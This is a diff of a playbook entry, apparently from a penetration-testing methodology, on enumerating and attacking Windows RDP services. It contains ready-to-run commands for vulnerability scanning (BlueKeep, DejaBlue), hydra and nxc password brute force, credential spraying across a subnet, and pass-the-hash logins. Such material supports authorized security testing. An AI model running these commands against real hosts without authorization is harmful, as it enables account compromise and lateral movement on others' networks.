@@ -3,39 +3,49 @@ id: rdp-enum
 title: RDP Enumeration
 stage: enumeration
 tags: [windows, rdp]
-tools:
-  - nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $TARGET
-  - nxc rdp $TARGET
-  - hydra -L users.txt -P passwords.txt rdp://$TARGET -t 4
-leads_to: [rdp-access, password-spray, public-exploit]
-summary: Check NLA status, enumerate RDP encryption level, and test for known vulnerabilities.
+summary: Check NLA status, encryption level, and vulnerability to BlueKeep/DejaBlue — NLA disabled means password brute-force is viable.
+leads_to:
+  - rdp-access
+  - password-spray
+  - public-exploit
 ---
 
-## Confirm & Fingerprint
+## Prerequisites
+
+Port 3389 open (also check 3390, 13389). No credentials needed for fingerprinting and vulnerability scanning.
+
+RDP enumeration tells you what you're dealing with before attempting login. NLA (Network Level Authentication) authenticates before displaying the login screen — brute-force still works but you can't see the OS. The BlueKeep/DejaBlue family of CVEs enables pre-auth RCE, but avoid running exploit modules on live targets — they crash hosts.
+
+## Quick Win
+
+> Fingerprint OS, NLA status, and security layer in one shot.
 
 ```bash
-nmap -p3389 --script rdp-enum-encryption $TARGET
 nxc rdp $TARGET
-# Look for: NLA enabled/disabled, OS version, security layer (RDP, TLS, CredSSP)
+nmap -p3389 --script rdp-enum-encryption $TARGET
 ```
 
-## Check for Known Vulnerabilities
+## Vulnerability Check
+
+> Pre-auth RCE checks — use scanner modules only, not exploit modules in production.
 
 ```bash
-# MS12-020 (DoS) and generic vuln check
+# BlueKeep (CVE-2019-0708) — Windows 7 / Server 2008 R2 and earlier
 nmap -p3389 --script rdp-vuln-ms12-020 $TARGET
+```
 
-# BlueKeep (CVE-2019-0708) — pre-auth RCE on Windows 7 / Server 2008
-# Use Metasploit — verify only, not exploit blindly
+```bash
+# Metasploit scanners (verify only)
 use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
-set RHOSTS $TARGET
-run
+set RHOSTS $TARGET; run
 
-# DejaBlue (CVE-2019-1181/1182) — Windows 8+/Server 2012+
-use auxiliary/scanner/rdp/cve_2019_1181_dejablue
+use auxiliary/scanner/rdp/cve_2019_1181_dejablue   # Windows 8+ / Server 2012+
+set RHOSTS $TARGET; run
 ```
 
 ## Brute Force (NLA Disabled Only)
+
+> Username + password brute — NLA must be disabled or test after NLA with known user list.
 
 ```bash
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://$TARGET -t 4
@@ -44,14 +54,13 @@ nxc rdp $TARGET -u users.txt -p passwords.txt --continue-on-success
 
 ## Spray Known Creds Across Subnet
 
+> Lateral movement — try cracked or found credentials against all RDP hosts.
+
 ```bash
 nxc rdp $CIDR -u administrator -p 'Password123'
-nxc rdp $CIDR -u administrator -H <NTLM_hash>  # PTH — RestrictedAdmin must be enabled
+nxc rdp $CIDR -u administrator -H <NTLM_hash>   # PTH — requires RestrictedAdmin mode enabled
 ```
 
-## Notes
+## Leads To
 
-- NLA (Network Level Authentication) challenges credentials before showing login — brute force still works but slower
-- RestrictedAdmin mode allows Pass-the-Hash over RDP: `xfreerdp /v:$TARGET /u:admin /pth:<hash>`
-- RDP on non-standard ports: 3390, 13389 — check all ports during nmap scan
-- BlueKeep is unreliable and often crashes the host — avoid unless controlled environment
+Valid credentials → rdp-access (GUI session, clipboard, file transfer). BlueKeep/DejaBlue vulnerable → public-exploit → SYSTEM (avoid in unstable environments). Credentials confirmed → password-spray the same creds against SMB, WinRM, and web. RestrictedAdmin mode enabled → Pass-the-Hash RDP with NTLM hash.
